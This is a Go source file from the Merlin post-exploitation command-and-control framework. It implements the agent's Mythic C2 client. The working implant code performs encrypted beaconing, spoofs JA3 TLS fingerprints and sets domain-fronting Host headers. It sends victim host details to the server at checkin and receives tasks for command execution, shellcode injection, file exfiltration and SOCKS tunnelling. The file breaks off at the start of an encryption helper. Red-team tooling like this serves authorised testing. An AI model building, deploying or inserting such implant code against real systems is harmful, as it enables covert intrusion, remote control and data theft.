//go:build mythic
// +build mythic

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2023  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package mythic

import (
	// Standard
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1" // #nosec G505
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	rand2 "math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	// 3rd Party
	"github.com/Ne0nd0g/ja3transport"
	"github.com/google/uuid"
	"golang.org/x/net/http2"

	// Merlin Main
	"github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/clients"
	"github.com/Ne0nd0g/merlin-agent/core"
)

// Files is a global map used to track Mythic's multistep file transfers. It holds data between requests
var Files = make(map[string]*jobs.FileTransfer)

// socksConnection is used to map the Mythic incremental integer used for tracking connections to a UUID leveraged by the agent
var socksConnection = sync.Map{}

// mythicSocksConnection is used to map Merlin's connection UUID to Mythic's integer server_id; Inverse of socksConnection
var mythicSocksConnection = sync.Map{}

// Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
type Client struct {
	clients.MerlinClient
	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
	MythicID   uuid.UUID         // The identifier used by the Mythic framework
	Client     *http.Client      // Client to send messages with
	Protocol   string            // The HTTP protocol the client will use
	URL        string            // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
	Host       string            // HTTP Host header value
	Proxy      string            // Proxy string
	Headers    map[string]string // Additional HTTP headers to add to the request
	UserAgent  string            // HTTP User-Agent value
	PaddingMax int               // PaddingMax is the maximum size allowed for a randomly selected message padding length
	JA3        string            // JA3 is a string that represent how the TLS client should be configured, if applicable
	psk        []byte            // PSK is the Pre-Shared Key secret the agent will use to start encrypted key exchange
	secret     []byte            // Secret is the current key that is being used to encrypt & decrypt data
	privKey    *rsa.PrivateKey   // Agent's RSA Private key to decrypt traffic
}

// Config is a structure that is used to pass in all necessary information to instantiate a new Client
type Config struct {
	AgentID   uuid.UUID // The Agent's UUID
	PayloadID string    // The UUID used with the Mythic framework
	Protocol  string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
	Host      string    // Host is used with the HTTP Host header for Domain Fronting activities
	URL       string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
	Proxy     string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
	UserAgent string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
	PSK       string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
	JA3       string    // JA3 is a string that represent how the TLS client should be configured, if applicable
	Padding   string    // Padding is the max amount of data that will be randomly selected and appended to every message
}

// New instantiates and returns a Client that is constructed from the passed in Config
func New(config Config) (*Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.New()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
	client := Client{
		AgentID:   config.AgentID,
		URL:       config.URL,
		UserAgent: config.UserAgent,
		Host:      config.Host,
		Protocol:  config.Protocol,
		Proxy:     config.Proxy,
		JA3:       config.JA3,
	}

	// Mythic: Add payload ID
	var err error
	client.MythicID, err = uuid.Parse(config.PayloadID)
	if err != nil {
		return &client, err
	}

	// Get the HTTP client
	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3)
	if err != nil {
		return &client, err
	}

	// Set PSK
	client.psk, err = base64.StdEncoding.DecodeString(config.PSK)
	if err != nil {
		return &client, fmt.Errorf("there was an error Base64 decoding the PSK:\r\n%s", err)
	}
	client.secret = client.psk

	// Generate RSA key pair
	client.privKey, err = rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return &client, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", err)
	}

	// Parse Padding Value
	client.PaddingMax, err = strconv.Atoi(config.Padding)
	if err != nil {
		cli.Message(cli.WARN, fmt.Sprintf("there was an error converting Padding string \"%s\" to an integer: %s", config.Padding, err))
	}

	cli.Message(cli.INFO, "Client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
	cli.Message(cli.INFO, fmt.Sprintf("\tProxy: %s", client.Proxy))
	cli.Message(cli.INFO, fmt.Sprintf("\tPayload Padding Max: %d", client.PaddingMax))
	cli.Message(cli.INFO, fmt.Sprintf("\tJA3 String: %s", client.JA3))

	return &client, nil
}

// Auth is used to match the merlin client interface but isn't currently used; Should probably fix the interface definition
func (client *Client) Auth(authType string, register bool) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Auth()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input authType: %s, register: %v", authType, register))
	return messages.Base{}, nil
}

// Send takes in a Merlin message structure, performs any encoding or encryption, and sends it to the server
// The function also decodes and decrypts response messages and return a Merlin message structure.
// This is where the client's logic is for communicating with the server.
func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Send()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("input message base:\r\n%+v", m))

	// Set the message padding
	if client.PaddingMax > 0 {
		m.Padding = core.RandStringBytesMaskImprSrc(rand2.Intn(client.PaddingMax))
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("Added message padding size: %d", len(m.Padding)))

	payload, err := client.convertToMythicMessage(m)
	if err != nil {
		err = fmt.Errorf("there was an error converting the Merlin message to a Mythic message:\r\n%s", err)
		return
	}

	// Build the request
	req, err := http.NewRequest("POST", client.URL, strings.NewReader(payload))
	if err != nil {
		err = fmt.Errorf("there was an error building the HTTP request:\r\n%s", err)
		return
	}

	// Add HTTP headers
	if req != nil {
		req.Header.Set("User-Agent", client.UserAgent)
		if client.Host != "" {
			req.Host = client.Host
		}
	}

	// Send the request
	cli.Message(cli.DEBUG, fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, client.URL))
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\r\n%+v", req))
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request Payload:\r\n%+v", req.Body))
	resp, err := client.Client.Do(req)
	if err != nil {
		err = fmt.Errorf("there was an error sending a message to the server:\r\n%s", err)
		return
	}

	// Process the response

	// Check the status code
	switch resp.StatusCode {
	case 200:
	default:
		err = fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
		return
	}

	// Read the response body
	respData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		err = fmt.Errorf("there was an error reading the HTTP payload response message:\r\n%s", err)
		return
	}

	// Base64 decode the payload
	decodedPayload, err := base64.StdEncoding.DecodeString(string(respData))
	if err != nil {
		err = fmt.Errorf("there was an error base64 decoding the HTTP payload response message:\r\n%s", err)
		return
	}

	// Verify UUID matches
	if !strings.HasPrefix(string(decodedPayload), client.MythicID.String()) {
		err = fmt.Errorf("response message agent ID %s does not match current ID %s",
			uuid.MustParse(string(decodedPayload[:len(client.MythicID)])), client.MythicID.String())
		return
	}

	// Strip the Mythic UUID from the payload
	decodedPayload = bytes.TrimPrefix(decodedPayload, []byte(client.MythicID.String()))

	// Decrypt the payload
	plaintext, err := client.aesDecrypt(decodedPayload)
	if err != nil {
		err = fmt.Errorf("there was an error decrypting the payload:\r\n%s", err)
		return
	}

	cli.Message(cli.DEBUG, fmt.Sprintf("Decrypted JSON:\r\n%s", plaintext))
	return client.convertToMerlinMessage(plaintext)
}

// Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
func (client *Client) Initial(agent messages.AgentInfo) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Initial()...")

	// Build initial checkin message
	checkIn := CheckIn{
		Action:        "checkin",
		IP:            selectIP(agent.SysInfo.Ips),
		OS:            agent.SysInfo.Platform,
		User:          agent.SysInfo.UserName,
		Host:          agent.SysInfo.HostName,
		PID:           strconv.Itoa(agent.SysInfo.Pid),
		PayloadID:     client.MythicID.String(), // Need to set now because it will be changed to tempUUID from RSA key exchange
		Arch:          agent.SysInfo.Architecture,
		Domain:        agent.SysInfo.Domain,
		Integrity:     agent.SysInfo.Integrity,
		ExternalIP:    "",
		EncryptionKey: "",
		DecryptionKey: "",
	}

	// RSA Key Exchange
	rsaRequest := RSARequest{
		Action:    RSAStaging,
		PubKey:    base64.StdEncoding.EncodeToString(x509.MarshalPKCS1PublicKey(&client.privKey.PublicKey)),
		SessionID: core.RandStringBytesMaskImprSrc(20),
	}

	base := messages.Base{
		ID:      client.AgentID,
		Type:    messages.KEYEXCHANGE,
		Payload: rsaRequest,
	}

	_, err := client.Send(base)
	if err != nil {
		return messages.Base{}, fmt.Errorf("there was an error performing RSA Key exchange:\r\n%s", err)
	}

	// Send checkin message
	base.Type = messages.CHECKIN
	base.Payload = checkIn

	_, err = client.Send(base)

	if err != nil {
		return messages.Base{}, err
	}

	returnMessage := messages.Base{
		ID:   client.AgentID,
		Type: messages.IDLE,
	}
	return returnMessage, nil
}

// Set is a generic function that is used to modify a Client's field values
func (client *Client) Set(key string, value string) error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Set()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
	var err error
	switch strings.ToLower(key) {
	case "ja3":
		ja3String := strings.Trim(value, "\"'")
		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String)
		if ja3String != "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Set agent JA3 signature to:%s", ja3String))
		} else if ja3String == "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
		}
		client.JA3 = ja3String
	default:
		err = fmt.Errorf("unknown mythic client setting: %s", key)
	}
	return err
}

// Get is a generic function that is used to retrieve the value of a Client's field
func (client *Client) Get(key string) string {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Get()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
	switch strings.ToLower(key) {
	case "ja3":
		return client.JA3
	case "protocol":
		return client.Protocol
	default:
		return fmt.Sprintf("unknown mythic client configuration setting: %s", key)
	}
}

// getClient returns a HTTP client for the passed protocol, proxy, and ja3 string
func getClient(protocol string, proxyURL string, ja3 string) (*http.Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.getClient()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Protocol: %s, Proxy: %s, JA3 String: %s", protocol, proxyURL, ja3))
	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
	}

	// Proxy
	var proxy func(*http.Request) (*url.URL, error)
	if proxyURL != "" {
		rawURL, errProxy := url.Parse(proxyURL)
		if errProxy != nil {
			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
		}
		proxy = http.ProxyURL(rawURL)
	} else {
		// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
		proxy = http.ProxyFromEnvironment
	}

	// JA3
	if ja3 != "" {
		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
		if errJA3 != nil {
			return nil, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
		}
		tr, err := ja3transport.NewTransportInsecure(ja3)
		if err != nil {
			return nil, err
		}

		// Set proxy
		if proxyURL != "" {
			tr.Proxy = proxy
		}

		JA3.Transport = tr

		return JA3.Client, nil
	}

	var transport http.RoundTripper
	switch strings.ToLower(protocol) {
	case "h2":
		TLSConfig.NextProtos = []string{"h2"} // https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml#alpn-protocol-ids
		transport = &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
	case "h2c":
		transport = &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		}
	case "https":
		TLSConfig.NextProtos = []string{"http/1.1"} // https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml#alpn-protocol-ids
		transport = &http.Transport{
			TLSClientConfig: TLSConfig,
			MaxIdleConns:    10,
			Proxy:           proxy,
			IdleConnTimeout: 1 * time.Nanosecond,
		}
	case "http":
		transport = &http.Transport{
			MaxIdleConns:    10,
			Proxy:           proxy,
			IdleConnTimeout: 1 * time.Nanosecond,
		}
	default:
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
	return &http.Client{Transport: transport}, nil
}

// convertToMerlinMessage takes in a byte array that is unmarshalled from a JSON structure to Mythic structure and
// then it is subsequently converted into a Merlin messages.Base structure
func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []messages.Base, err error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertToMerlinMessage()...")
	// Determine the action so we know what structure to unmarshal to
	var action string
	if bytes.Contains(data, []byte("\"action\":\"checkin\"")) {
		action = CHECKIN
	} else if bytes.Contains(data, []byte("\"action\":\"get_tasking\"")) {
		action = TASKING
	} else if bytes.Contains(data, []byte("\"action\":\"post_response\"")) {
		action = RESPONSE
	} else if bytes.Contains(data, []byte("\"action\":\"staging_rsa\"")) {
		action = RSAStaging
	} else if bytes.Contains(data, []byte("\"action\":\"upload\"")) {
		action = UPLOAD
	} else {
		err = fmt.Errorf("message did not contain a known action:\r\n%s", data)
		return
	}

	returnMessage := messages.Base{
		ID:   client.AgentID,
		Type: messages.IDLE,
	}

	// Logic for processing or converting Mythic messages
	cli.Message(cli.DEBUG, fmt.Sprintf("Action: %s", action))
	switch action {
	case CHECKIN:
		var msg Response
		// Unmarshal the JSON message
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object in the message handler:\r\n%s", err)
			return
		}
		if msg.Status == "success" {
			cli.Message(cli.SUCCESS, "initial checkin successful")
			client.MythicID = uuid.MustParse(msg.ID)
			return
		}
		err = fmt.Errorf("unknown checkin action status:\r\n%+v", msg)
		return
	case RSAStaging:
		// https://docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin#eke-by-generating-client-side-rsa-keys
		var msg RSAResponse
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.RSAResponse in the message handler:\r\n%s", err)
			return
		}
		// Base64 decode session key
		var key []byte
		key, err = base64.StdEncoding.DecodeString(msg.SessionKey)
		if err != nil {
			err = fmt.Errorf("there was an error Base64 decoding the RSA session key:\r\n%s", err)
			return
		}
		// Decrypt with RSA Private key and update the Client's secret key to use the session key
		hash := sha1.New() // #nosec G401
		client.secret, err = rsa.DecryptOAEP(hash, rand.Reader, client.privKey, key, nil)
		if err != nil {
			err = fmt.Errorf("there was an error decrypting the returned RSA session key:\r\n%s", err)
			return
		}
		// Update to use new Temp UUID
		client.MythicID = uuid.MustParse(msg.ID)
		cli.Message(cli.SUCCESS, "RSA key exchange completed")
		return
	case TASKING:
		var msg Tasks
		// Unmarshal the JSON message
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object to mythic.Tasks in the message handler:\r\n%s", err)
			return
		}
		// If there are any tasks/jobs, add them
		if len(msg.Tasks) > 0 {
			cli.Message(cli.DEBUG, fmt.Sprintf("returned Mythic tasks:\r\n%+v", msg))
			returnMessage, err = client.convertTasksToJobs(msg.Tasks)
			if err != nil {
				return
			}
			returnMessages = append(returnMessages, returnMessage)
		}
		// SOCKS5
		if len(msg.SOCKS) > 0 {
			// There is SOCKS data to send to the SOCKS server
			returnMessage, err = client.convertSocksToJobs(msg.SOCKS)
			if err != nil {
				cli.Message(cli.WARN, err.Error())
			}
			if len(returnMessage.Payload.([]jobs.Job)) > 0 {
				returnMessages = append(returnMessages, returnMessage)
			}
		}
	case RESPONSE:
		// https://docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/action-post_response
		var msg ServerPostResponse
		err = json.Unmarshal(data, &msg)
		if err != nil {
			err = fmt.Errorf("there was an error unmarshalling the JSON object to a mythic.ServerTaskResponse structure in the message handler:\r\n%s", err)
			return
		}
		cli.Message(cli.NOTE, fmt.Sprintf("post_response results from the server: %+v", msg))
		for _, response := range msg.Responses {
			if response.Error != "" {
				cli.Message(cli.WARN, fmt.Sprintf("There was an error sending a task to the Mythic server:\r\n%+v", response))
			}
			if response.FileID != "" {
				cli.Message(cli.DEBUG, fmt.Sprintf("Mythic FileID: %s", response.FileID))
				if response.Status == "success" {
					// Pull file data from map
					if d, ok := Files[response.ID]; ok {
						// Send actual data
						f := FileDownload{
							Chunk:  1,
							FileID: response.FileID,
							TaskID: response.ID,
							Data:   d.FileBlob,
						}
						returnMessage.ID = client.AgentID
						returnMessage.Type = DownloadSend
						returnMessage.Payload = f
						// This isn't great because now we're in recursive Send, but YOLO
						var msgs []messages.Base
						msgs, err = client.Send(returnMessage)
						if err != nil {
							err = fmt.Errorf("there was an error sending the mythic FileDownload message to the server:\r\n%s", err)
							return
						}
						for _, m := range msgs {
							if m.Token != "" {
								// Remove the file from the global Files structure
								delete(Files, m.Token)
								returnMessages = append(returnMessages, m)
							} else {
								err = fmt.Errorf("file download response did not have a task ID:\r\n%+v", m)
								return
							}
						}
					}
					err = fmt.Errorf("the Mythic global Files map did not contain data for task %s", response.ID)
					return
				}
			}
			if response.Status == "success" && response.ID != "" {
				returnMessage.Token = response.ID
				returnMessage.Type = messages.IDLE
				returnMessages = append(returnMessages, returnMessage)
			}
		}
		return
	default:
		err = fmt.Errorf("unknown Mythic action: %s", action)
		return
	}
	return
}

// convertToMythicMessages takes in Merlin message base, converts it into to a Mythic message JSON structure,
// encrypts it, prepends the Mythic UUID, and Base64 encodes the entire string
func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertToMythic()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input Merlin message base:\r\n %+v", m))

	var err error
	var data []byte

	switch m.Type {
	case messages.CHECKIN:
		// Send the very first checkin message
		if m.Payload != nil {
			msg := m.Payload.(CheckIn)
			msg.Padding = m.Padding
			// Marshal the structure to a JSON object
			data, err = json.Marshal(msg)
			if err != nil {
				return "", fmt.Errorf("there was an error marshalling the mythic.CheckIn structrong to JSON:\r\n%s", err)
			}
		} else { // Merlin had no responses to send back
			task := Tasking{
				Action:  TASKING,
				Size:    -1,
				Padding: m.Padding,
			}
			// Marshal the structure to a JSON object
			data, err = json.Marshal(task)
			if err != nil {
				return "", fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\r\n%s", err)
			}
		}
	case messages.JOBS:
		returnMessage := PostResponse{
			Action:    RESPONSE,
			Padding:   m.Padding,
			SOCKS:     []Socks{},
			Responses: []ClientTaskResponse{},
		}
		// Convert Merlin jobs to mythic response
		for _, job := range m.Payload.([]jobs.Job) {
			var response ClientTaskResponse
			response.ID = uuid.MustParse(job.ID)
			response.Completed = true
			cli.Message(cli.DEBUG, fmt.Sprintf("Converting Merlin job type: %d to Mythic response", job.Type))
			switch job.Type {
			case jobs.RESULT:
				response.Output = job.Payload.(jobs.Results).Stdout
				if job.Payload.(jobs.Results).Stderr != "" {
					response.Output += job.Payload.(jobs.Results).Stderr
					response.Status = StatusError
				}
				returnMessage.Responses = append(returnMessage.Responses, response)
			case jobs.AGENTINFO:
				info, err := json.Marshal(job.Payload)
				if err != nil {
					response.Output = fmt.Sprintf("there was an error marshalling the AgentInfo structure to JSON:\r\n%s", err)
					response.Status = StatusError
				}
				response.Output = string(info)
				returnMessage.Responses = append(returnMessage.Responses, response)
			case jobs.FILETRANSFER:
				// Add to global Files map so it can be retrieved later
				f := job.Payload.(jobs.FileTransfer)
				Files[job.ID] = &f
				// Download

				if f.IsDownload {
					var fm FileDownloadInitialMessage
					fm.FullPath = f.FileLocation
					fm.IsScreenshot = false
					fm.TaskID = job.ID
					fm.NumChunks = 1

					returnMessage := messages.Base{
						ID:      client.AgentID,
						Type:    DownloadInit,
						Payload: fm,
					}

					// Get FileID from Mythic
					// This isn't great because now we're in recursive Send, but YOLO
					_, err := client.Send(returnMessage)
					if err != nil {
						return "", fmt.Errorf("there was an error sending the mythic FileDownload message to the server:\r\n%s", err)
					}
				}
				returnMessage.Responses = append(returnMessage.Responses, response)
			case jobs.SOCKS:
				sockMsg := job.Payload.(jobs.Socks)
				// SOCKS server's initial response is 0x05, 0x00
				if bytes.Equal(sockMsg.Data, []byte{0x05, 0x00}) {
					// Drop the job because Mythic doesn't need it for anything and we are spoofing the SOCKS handshake agent side
					break
				}

				sock := Socks{
					Exit: sockMsg.Close,
				}
				// Translate Merlin's SOCKS connection UUID to a Mythic server_id integer
				id, ok := mythicSocksConnection.Load(sockMsg.ID)
				if !ok {
					err = fmt.Errorf("there was an error mapping the SOCKS connection ID %s to the Mythic connection ID", sockMsg.ID)
					return "", err
				}
				sock.ServerId = id.(int32)

				// Base64 encode the data
				sock.Data = base64.StdEncoding.EncodeToString(sockMsg.Data)

				// Add to return message
				returnMessage.SOCKS = append(returnMessage.SOCKS, sock)

				// Clean up the maps
				if sockMsg.Close {
					socksConnection.Delete(id)
					mythicSocksConnection.Delete(sockMsg.ID)
				}
			default:
				return "", fmt.Errorf("unhandled job type in convertToMythicMessage: %s", job.Type)
			}
		}
		// Marshal the structure to a JSON object
		if len(returnMessage.Responses) == 0 && len(returnMessage.SOCKS) == 0 {
			// Used when an input Merlin job has a SOCKS type but we drop the message and don't want to send it to Mythic
			task := Tasking{
				Action:  TASKING,
				Size:    -1,
				Padding: m.Padding,
			}
			// Marshal the structure to a JSON object
			data, err = json.Marshal(task)
			if err != nil {
				return "", fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\r\n%s", err)
			}
		} else {
			data, err = json.Marshal(returnMessage)
			if err != nil {
				return "", fmt.Errorf("there was an error marshalling the mythic.PostResponse structure to JSON:\r\n%s", err)
			}
		}

	case messages.KEYEXCHANGE:
		if m.Payload != nil {
			msg := m.Payload.(RSARequest)
			msg.Padding = m.Padding
			data, err = json.Marshal(msg)
			if err != nil {
				return "", fmt.Errorf("there was an error marshalling the mythic.RSARequest structrong to JSON:\r\n%s", err)
			}
		}
	case DownloadInit:
		returnMessage := PostResponseFile{
			Action:  RESPONSE,
			Padding: m.Padding,
		}
		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(FileDownloadInitialMessage))
		data, err = json.Marshal(returnMessage)
		if err != nil {
			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownloadInitial structure to JSON:\r\n%s", err)
		}
	case DownloadSend:
		returnMessage := PostResponseDownload{
			Action:  RESPONSE,
			Padding: m.Padding,
		}
		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(FileDownload))
		data, err = json.Marshal(returnMessage)
		if err != nil {
			return "", fmt.Errorf("there was an error marshalling the mythic.FileDownload structure to JSON:\r\n%s", err)
		}
	default:
		return "", fmt.Errorf("unhandled message type: %d for convertToMythicMessage()", m.Type)
	}

	// AES Encrypt payload
	ciphertext, err := client.aesEncrypt(data)
	if err != nil {
		return "", fmt.Errorf("there was an error AES encrypting the Mythic task:\r\n%s", err)
	}

	// Build Mythic data structure: Base64(<Payload UUID> AES(JSON))
	payload := append([]byte(client.MythicID.String()), ciphertext...)

	// Base64 encode the payload
	msg := base64.StdEncoding.EncodeToString(payload)

	return msg, nil
}

// convertSocksToJobs takes in Mythic socks messages and translates them into Merlin jobs
func (client *Client) convertSocksToJobs(socks []Socks) (base messages.Base, err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Entering into clients.mythic.convertSocksToJobs() with %+v", socks))

	base.Version = 1
	base.Type = messages.JOBS
	base.ID = client.AgentID

	var returnJobs []jobs.Job

	for _, sock := range socks {
		job := jobs.Job{
			AgentID: client.AgentID,
			Type:    jobs.SOCKS,
		}
		payload := jobs.Socks{
			Close: sock.Exit,
		}

		// Translate Mythic's server ID to UUID
		id, ok := socksConnection.Load(sock.ServerId)
		if !ok {
			// This is for a new, first time, SOCKS connection
			id = uuid.New()
			socksConnection.Store(sock.ServerId, id)
			mythicSocksConnection.Store(id, sock.ServerId)

			// Spoof SOCKS handshake with Merlin Agent
			payload.ID = id.(uuid.UUID)
			payload.Data = []byte{0x05, 0x01, 0x00}
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		}
		payload.ID = id.(uuid.UUID)

		// Base64 decode the data
		payload.Data, err = base64.StdEncoding.DecodeString(sock.Data)
		if err != nil {
			err = fmt.Errorf("there was an error base64 decoding the SOCKS message data: %s", err)
			return
		}
		job.Payload = payload
		returnJobs = append(returnJobs, job)
	}
	base.Payload = returnJobs
	return
}

// convertTasksToJobs is a function that converts Mythic tasks into a Merlin jobs structure
func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertTasksToJobs()")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input task:\r\n%+v", tasks))

	// Merlin messages.Base structure
	base := messages.Base{
		Version: 1,
		ID:      client.AgentID,
		Type:    messages.JOBS,
	}

	var returnJobs []jobs.Job

	for _, task := range tasks {
		var mythicJob Job
		var job jobs.Job
		err := json.Unmarshal([]byte(task.Params), &mythicJob)
		if err != nil {
			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the Mythic task parameters to a mythic.Job:\r\n%s", err)
		}
		job.AgentID = client.AgentID
		job.ID = task.ID
		job.Token = uuid.MustParse(task.ID)
		job.Type = mythicJob.Type

		cli.Message(cli.DEBUG, fmt.Sprintf("Switching on mythic.Job type %d", mythicJob.Type))

		switch mythicJob.Type {
		case jobs.CMD, jobs.CONTROL, jobs.NATIVE:
			var payload jobs.Command
			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.CMD structure:\r\n%s", err)
			}
			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.Command structure:\r\n%+v", payload))
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case jobs.FILETRANSFER:
			var payload jobs.FileTransfer
			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.FileTransfer structure:\r\n%s", err)
			}
			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.FileTransfer structure:\r\n%+v", payload))
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case jobs.MODULE:
			var payload jobs.Command
			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Command structure:\r\n%s", err)
			}
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case jobs.SHELLCODE:
			var payload jobs.Shellcode
			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Shellcode structure:\r\n%s", err)
			}
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case jobs.SOCKS:
			var payload jobs.Socks
			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Socks structure:\r\n", err)
			}
		case 0:
			// case 0 means that a job type was not added to the task from the Mythic server
			// Commonly seen with SOCKS messages
			if strings.ToLower(task.Command) == "socks" {
				cli.Message(cli.NOTE, fmt.Sprintf("Received Mythic SOCKS task: %+v", task))
				var params SocksParams
				err = json.Unmarshal([]byte(task.Params), &params)
				if err != nil {
					return base, fmt.Errorf("there was an error unmarshalling the Mythic SOCKS Params payload: %s", err)
				}
				switch params.Action {
				case "start", "stop":
					// TODO Set agent sleep to 0 if start
					// Send message back to Mythic that SOCKS has been started/stoped
					job.Type = jobs.RESULT
					job.Payload = jobs.Results{}
					returnJobs = append(returnJobs, job)
				default:
					cli.Message(cli.WARN, fmt.Sprintf("Unknown socks command: %s", params.Action))
				}
			} else {
				cli.Message(cli.WARN, fmt.Sprintf("Unhandled Mythic task %+v", task))
			}
		default:
			return base, fmt.Errorf("unknown mythic.job type: %d", mythicJob.Type)
		}
	}

	// Add the list of jobs to the message base
	base.Payload = returnJobs

	return base, nil
}

// aesEncrypt reads in plaintext data as aa byte slice, encrypts it with the client's secret key, and returns the ciphertext
